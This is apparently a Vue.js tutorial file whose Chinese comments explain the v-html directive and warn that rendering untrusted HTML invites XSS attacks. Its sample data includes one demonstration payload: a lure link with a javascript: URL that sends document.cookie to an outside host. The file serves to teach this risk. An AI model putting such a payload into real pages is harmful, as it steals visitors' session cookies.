<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body>
    <!-- 
				v-html指令：
						1.作用：向指定節點中渲染包含html結構的內容。
						2.與插值語法的區別：
									(1).v-html會替換掉節點中所有的內容，{{xx}}則不會。
									(2).v-html可以識別html結構。
						3.嚴重注意：v-html有安全性問題！！！！
									(1).在網站上動態渲染任意HTML是非常危險的，容易導致XSS攻擊。
									(2).一定要在可信的內容上使用v-html，永不要用在使用者提交的內容上！
		-->
    <div id="root">
      <div>你好，{{name}}</div>
      <div v-html="str"></div>
      <div v-html="str2"></div>
    </div>
    <script src="../js/vue.js"></script>
    <script async>
      Vue.config.productionTip = false;
    </script>
    <script>
      new Vue({
        el: "#root",
        data: {
          name: "Genesis",
          str: "<h3>你好阿</h3>",
          str2: "<a href=javascript:location.href='https://www.google.com?'+document.cookie>兄弟我找到你想要的资源了，快来！</a>",
        },
      });
    </script>
  </body>
</html>
